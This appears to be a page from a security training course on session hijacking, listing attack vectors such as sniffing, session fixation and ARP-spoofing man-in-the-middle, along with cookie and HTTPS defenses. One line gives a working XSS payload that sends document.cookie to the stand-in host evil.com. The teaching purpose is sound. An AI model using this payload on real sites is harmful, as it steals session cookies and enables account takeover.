🍪 Module 11: Session Hijacking

Steal and reuse session tokens to impersonate users.

Lab Progress: 0%

🎯 Attack Vectors

  • Session Sniffing: Capture unencrypted cookies (HTTP, FTP).
  • Cross-Site Scripting (XSS): <script>fetch('http://evil.com?c='+document.cookie)</script>
  • Session Fixation: Force user to use a known session ID.
  • Man-in-the-Middle (MITM): ARP spoofing + packet capture.

🛡️ Defenses

  • Use HTTPS with HSTS.
  • Set cookies: HttpOnly; Secure; SameSite=Strict.
  • Regenerate session ID after login.
  • Implement short session timeouts.
